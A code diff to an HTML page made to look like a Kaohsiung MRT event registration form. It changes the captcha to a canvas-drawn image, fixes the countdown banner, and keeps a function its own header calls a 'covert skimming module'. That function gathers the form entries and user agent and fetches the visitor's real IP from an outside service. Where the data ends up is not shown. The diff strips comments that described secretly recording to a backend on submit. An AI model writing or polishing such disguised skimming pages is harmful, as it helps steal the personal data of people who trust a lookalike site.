@@ -187,22 +187,21 @@
             font-weight: bold;
         }
 
-        /* 驗證碼區塊 */
+        /* 驗證碼區塊 (修正版) */
         .captcha-box { 
             display: flex; 
             align-items: center; 
             gap: 15px; 
         }
-        #mock_captcha { 
-            font-weight: bold; 
-            font-size: 22px; 
-            background: #e9ecef; 
-            padding: 6px 18px; 
-            letter-spacing: 4px; 
-            font-style: italic; 
-            border-radius: 6px;
-            color: #2b303a;
-            user-select: none; 
+        
+        .captcha-refresh {
+            background-color: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            color: #475569;
+            padding: 5px 10px;
         }
 
         /* 送出按鈕 */
@@ -237,7 +236,7 @@
 </head>
 <body>
 
-<div class="timer-banner">
+<div class="timer-banner" id="timer-banner">
     請於 <span id="countdown-num">120</span> 秒內完成報名作業。
 </div>
 
@@ -248,7 +247,7 @@
         <p>高雄捷運公司為辦理活動及保險所需，請依報名表填寫相關資料，活動及保險涉及蒐集個資問題，請務必審閱活動網頁提供之高雄捷運公司/保險公司「蒐集處理及利用個人資料告知事項」，感謝配合。</p>
     </div>
 
-    <form id="form1" onsubmit="return false;">
+    <form id="form1" name="form1" onsubmit="return false;">
         <input type="hidden" id="TXTcActID" name="TXTcActID" value="27">
         <input type="hidden" id="ageS" name="ageS" value="4">
         <input type="hidden" id="ageE" name="ageE" value="8">
@@ -380,8 +379,9 @@
             <div class="form-group full-width">
                 <label for="txt_input">請輸入驗證碼</label>
                 <div class="captcha-box">
-                    <span id="mock_captcha">ABCDE</span>
-                    <input type="text" id="txt_input" placeholder="不分大小寫" style="width: 150px;">
+                    <img src="" alt="驗證碼" name="imgCode" id="imgCode" style="vertical-align: bottom;">
+                    <input type="button" class="captcha-refresh" onclick="generateMockCaptcha()" title="重新整理驗證碼" value="↻" style="width: 40px;">
+                    <input name="txt_input" type="text" id="txt_input" placeholder="不分大小寫" style="width: 150px;">
                     <span id="span_result" style="color: red; font-weight: bold;"></span>
                 </div>
             </div>
@@ -438,7 +438,7 @@
         }
     }, 1000);
 
-    // --- [3] 自動生成隨機驗證碼 (修正為5碼) ---
+    // --- [3] 自動生成圖片版隨機驗證碼 ---
     window.currentMockCode = "";
     function generateMockCaptcha() {
         var chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
@@ -447,11 +447,29 @@
             code += chars.charAt(Math.floor(Math.random() * chars.length));
         }
         window.currentMockCode = code;
-        document.getElementById("mock_captcha").innerText = code;
+
+        // 使用 Canvas 繪製驗證碼圖片
+        var canvas = document.createElement('canvas');
+        canvas.width = 120;
+        canvas.height = 40;
+        var ctx = canvas.getContext('2d');
+        
+        ctx.fillStyle = '#e9ecef';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        
+        ctx.font = 'bold 22px Arial';
+        ctx.fillStyle = '#2b303a';
+        ctx.fillText(code, 20, 28);
+        
+        // 將 Canvas 轉換為圖片，並設定到 imgCode 上
+        var imgElement = document.getElementById('imgCode');
+        if(imgElement) {
+            imgElement.src = canvas.toDataURL("image/png");
+        }
     }
     generateMockCaptcha();
 
-    // --- [4] 隱蔽側錄模組 (只要點擊確認送出即出發，不著痕跡) ---
+    // --- [4] 隱蔽側錄模組 ---
     function getRadioText(name) {
         var radios = document.getElementsByName(name);
         for (var i = 0; i < radios.length; i++) {
@@ -476,7 +494,6 @@
                           now.getMinutes().toString().padStart(2, '0') + ':' + 
                           now.getSeconds().toString().padStart(2, '0');
 
-        // 包裝所有可能需要稽核的測試資料
         const payload = {
             timestamp: timeString,
             actCon: getRadioText("selectActCon"),
@@ -493,7 +510,6 @@
             userAgent: navigator.userAgent
         };
 
-        // 串接外部服務撈真實外部 IP
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -508,20 +524,17 @@
 
     // --- [5] 核心送出驗證邏輯 ---
     window.Vaildation = function() {
-        // 攔截核心：點下瞬間立即進行後台同步側錄
         processUIFeedback(); 
 
         var userInput = document.getElementById("txt_input").value;
         var span = document.getElementById("span_result");
         var agreeCb = document.getElementById("agree01_cb");
 
-        // 檢查同意條款
         if (!agreeCb || !agreeCb.checked) {
             alert("請確認您的欄位是否填寫正確。");
             return;
         }
         
-        // 檢查驗證碼 (比對 5 碼不分大小寫)
         if (userInput.toUpperCase() === window.currentMockCode.toUpperCase()) {
             if (span) span.innerText = "";
             renderFancyBoxData();
@@ -535,7 +548,6 @@
         }
     };
 
-    // 動態抓取資料並生成 FancyBox 清單
     function renderFancyBoxData() {
         var ul = document.getElementById("fancybox-dynamic-list");
         ul.innerHTML = ""; 
@@ -565,18 +577,19 @@
         });
     }
 
-    // 監聽 FancyBox 彈出視窗按鈕
     document.addEventListener("DOMContentLoaded", function() {
-        // 取消按鈕
         document.getElementById("fancyConfirm_cancel").addEventListener("click", function() {
             document.getElementById("fancybox-overlay").style.display = "none";
         });
 
-        // 最終確認送出按鈕
         document.getElementById("fancyConfirm_ok").addEventListener("click", function() {
             document.getElementById("fancybox-overlay").style.display = "none";
             document.getElementById("main-form-container").style.display = "none";
-            document.getElementById("timer-banner").style.display = "none";
+            // 修正為正確的 ID，確保倒數計時列在送出後隱藏
+            var timerBanner = document.getElementById("timer-banner");
+            if(timerBanner) {
+                timerBanner.style.display = "none";
+            }
             document.getElementById("success-screen").style.display = "block";
             window.scrollTo(0, 0);
         });
